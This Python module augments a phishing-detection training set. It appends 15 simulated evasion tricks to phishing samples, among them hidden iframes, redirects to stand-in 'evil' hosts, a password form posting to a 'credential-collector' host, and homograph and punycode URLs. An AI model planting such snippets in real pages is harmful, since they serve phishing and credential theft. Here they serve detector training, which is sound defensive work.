"""Adversarial data augmentation for the HTML/URL training set.

Each attack is a (html, url) -> (html, url) transform that simulates one
real-world evasion pattern. Training on these variants alongside the raw
samples makes the retrained models robust to the same tricks phishing
sites already use.
"""

import base64
import logging
import random
from collections import defaultdict
from urllib.parse import urlparse

import pandas as pd

logger = logging.getLogger(__name__)


def js_redirect_injection(html: str, url: str):
    return (
        html + '<script>window.location = "http://evil-simulated.example";</script>',
        url,
    )


def hidden_iframe(html: str, url: str):
    return (
        html
        + '<iframe src="http://tracker.example" '
        'style="opacity:0;width:1px;height:1px;"></iframe>',
        url,
    )


def base64_script_block(html: str, url: str):
    payload = base64.b64encode(b"var creds = collectCredentials();" * 4).decode()
    return html + f"<script>{payload}</script>", url


def css_hidden_text(html: str, url: str):
    return (
        html
        + '<div style="text-indent:-9999px;">verify your account immediately</div>',
        url,
    )


def homograph_attack(html: str, url: str):
    parsed = urlparse(url)
    homoglyph_netloc = parsed.netloc.replace("a", "а")  # Cyrillic "а"
    return html, parsed._replace(netloc=homoglyph_netloc).geturl()


def zero_width_char_insertion(html: str, url: str):
    zwsp = "​"
    return html + f'<a href="{url}">l{zwsp}o{zwsp}g{zwsp}in</a>', url


def meta_refresh_redirect(html: str, url: str):
    return (
        html
        + '<meta http-equiv="refresh" content="0;url=http://evil-simulated.example">',
        url,
    )


def external_form_action(html: str, url: str):
    return (
        html
        + '<form action="http://credential-collector.example/submit">'
        '<input name="password"></form>',
        url,
    )


def external_favicon(html: str, url: str):
    return (
        html + '<link rel="icon" href="http://phishy-cdn.example/favicon.ico">',
        url,
    )


def dom_cloaking(html: str, url: str):
    return (
        html
        + "<noscript>This is the real legitimate page content.</noscript>"
        '<script>document.write("This is fake safe-looking content");</script>',
        url,
    )


def url_shortener_chain(html: str, url: str):
    return html + '<a href="http://bit.ly/3xampl3">verify now</a>', url


def punycode_domain(html: str, url: str):
    return html + '<a href="http://xn--80ak6aa92e.com">secure login</a>', url


def ip_address_hostname(html: str, url: str):
    return html + '<a href="http://192.168.1.100/login">my account</a>', url


def subdomain_overload(html: str, url: str):
    parsed = urlparse(url)
    overloaded_netloc = f"login.secure.account.verify.{parsed.netloc}"
    return html, parsed._replace(netloc=overloaded_netloc).geturl()


def mixed_content(html: str, url: str):
    return html + '<img src="http://insecure-asset.example/logo.png">', url


ADVERSARIAL_ATTACKS = [
    ("js_redirect_injection", js_redirect_injection),
    ("hidden_iframe", hidden_iframe),
    ("base64_script_block", base64_script_block),
    ("css_hidden_text", css_hidden_text),
    ("homograph_attack", homograph_attack),
    ("zero_width_char_insertion", zero_width_char_insertion),
    ("meta_refresh_redirect", meta_refresh_redirect),
    ("external_form_action", external_form_action),
    ("external_favicon", external_favicon),
    ("dom_cloaking", dom_cloaking),
    ("url_shortener_chain", url_shortener_chain),
    ("punycode_domain", punycode_domain),
    ("ip_address_hostname", ip_address_hostname),
    ("subdomain_overload", subdomain_overload),
    ("mixed_content", mixed_content),
]

assert len(ADVERSARIAL_ATTACKS) == 15


class AdversarialAugmentor:
    VARIANTS_PER_SAMPLE = 3
    ATTACKS_PER_VARIANT = 3

    def augment_dataset(self, df: pd.DataFrame) -> pd.DataFrame:
        phishing_df = df[df["label"] == "phishing"]

        augmented_rows = []
        attack_counts: dict = defaultdict(int)

        for _, row in phishing_df.iterrows():
            for _ in range(self.VARIANTS_PER_SAMPLE):
                chosen = random.sample(ADVERSARIAL_ATTACKS, self.ATTACKS_PER_VARIANT)

                html = row["html_features"] or ""
                url = row["url"]
                for name, attack_fn in chosen:
                    html, url = attack_fn(html, url)
                    attack_counts[name] += 1

                augmented_rows.append(
                    {"url": url, "html_features": html, "label": row["label"]}
                )

        augmented_df = pd.DataFrame(
            augmented_rows, columns=["url", "html_features", "label"]
        )
        combined = (
            pd.concat([df, augmented_df], ignore_index=True)
            if not augmented_df.empty
            else df.copy()
        )
        combined.attrs["attack_type_counts"] = dict(attack_counts)

        logger.info(
            "Adversarial augmentation added %d samples from %d phishing rows",
            len(augmented_df),
            len(phishing_df),
        )
        for name, count in sorted(attack_counts.items()):
            logger.info("  %s: %d samples", name, count)

        return combined
